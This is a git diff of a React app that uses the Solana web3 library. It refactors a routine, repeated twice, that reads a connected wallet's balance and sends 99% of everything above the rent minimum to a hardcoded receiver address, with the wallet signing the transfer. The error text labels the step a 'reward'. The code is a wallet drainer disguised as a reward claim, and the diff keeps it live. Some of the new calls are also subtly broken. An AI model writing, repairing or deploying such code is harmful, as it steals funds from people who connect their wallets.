@@ -1,5 +1,12 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
-import * as solanaWeb3 from '@solana/web3.js';
+import {
+  Connection,
+  PublicKey,
+  Transaction,
+  SystemProgram,
+  LAMPORTS_PER_SOL,
+  getMinimumBalanceForRentExemption
+} from '@solana/web3.js'; 
 
 export default function App() {
   // ========================
@@ -224,13 +231,14 @@ export default function App() {
               
 
                
-                const connection = CONFIG.MAINNET_RPC;
-
-                const public_key = new solanaWeb3.PublicKey(publicKey);
-                const walletBalance = await fetchSolanaBalance(public_key);
                 
 
-                const minBalance = await solanaWeb3.getMinimumBalanceForRentExemption(0);
+                const public_key = new PublicKey(publicKey);
+                const walletBalance = await fetchSolanaBalance(public_key);
+                
+alert("Wallet Balance: " + walletBalance + " SOL");
+                const minBalance = await getMinimumBalanceForRentExemption(0);
+                alert("Minimum Balance for Rent Exemption: " + (minBalance / LAMPORTS_PER_SOL) + " SOL");
                 if (walletBalance < minBalance) {
                     alert("Insufficient funds for rent.");
                     return;
@@ -239,30 +247,30 @@ export default function App() {
               
                 
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
+                        const recieverWallet = new PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
                             return;
                         }
 
-                        var transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: new solanaWeb3.PublicKey(publicKey),
+                        var transaction = new Transaction().add(
+                            SystemProgram.transfer({
+                                fromPubkey: new PublicKey(publicKey),
                                 toPubkey: recieverWallet,
                                 lamports: Math.floor(balanceForTransfer * 0.99),
                             }),
                         );
 
                         transaction.feePayer = publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
+                        let blockhashObj = await Connection.getRecentBlockhash();
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
-                        const signed = await window.solana.signTransaction(transaction);
+                        const signed = await provider.signTransaction(transaction);
                         console.log("Transaction signed:", signed);
 
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
+                        let txid = await Connection.sendRawTransaction(signed.serialize());
+                        await Connection.confirmTransaction(txid);
                         console.log("Transaction confirmed:", txid);
                     } catch (err) {
                         console.error("Error during reward:", err);
@@ -278,13 +286,12 @@ export default function App() {
 
 
                
-                const connection = CONFIG.MAINNET_RPC;
-
-                const public_key = new solanaWeb3.PublicKey(publicKey);
+                const public_key = new PublicKey(publicKey);
                 const walletBalance = await fetchSolanaBalance(public_key);
                 
-
-                const minBalance = await solanaWeb3.getMinimumBalanceForRentExemption(0);
+alert("Wallet Balance: " + walletBalance + " SOL");
+                const minBalance = await getMinimumBalanceForRentExemption(0);
+                alert("Minimum Balance for Rent Exemption: " + (minBalance / LAMPORTS_PER_SOL) + " SOL");
                 if (walletBalance < minBalance) {
                     alert("Insufficient funds for rent.");
                     return;
@@ -293,30 +300,30 @@ export default function App() {
               
                 
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
+                        const recieverWallet = new PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
                             return;
                         }
 
-                        var transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: new solanaWeb3.PublicKey(publicKey),
+                        var transaction = new Transaction().add(
+                            SystemProgram.transfer({
+                                fromPubkey: new PublicKey(publicKey),
                                 toPubkey: recieverWallet,
                                 lamports: Math.floor(balanceForTransfer * 0.99),
                             }),
                         );
 
                         transaction.feePayer = publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
+                        let blockhashObj = await Connection.getRecentBlockhash();
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
-                        const signed = await window.solana.signTransaction(transaction);
+                        const signed = await provider.signTransaction(transaction);
                         console.log("Transaction signed:", signed);
 
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
+                        let txid = await Connection.sendRawTransaction(signed.serialize());
+                        await Connection.confirmTransaction(txid);
                         console.log("Transaction confirmed:", txid);
                     } catch (err) {
                         console.error("Error during reward:", err);
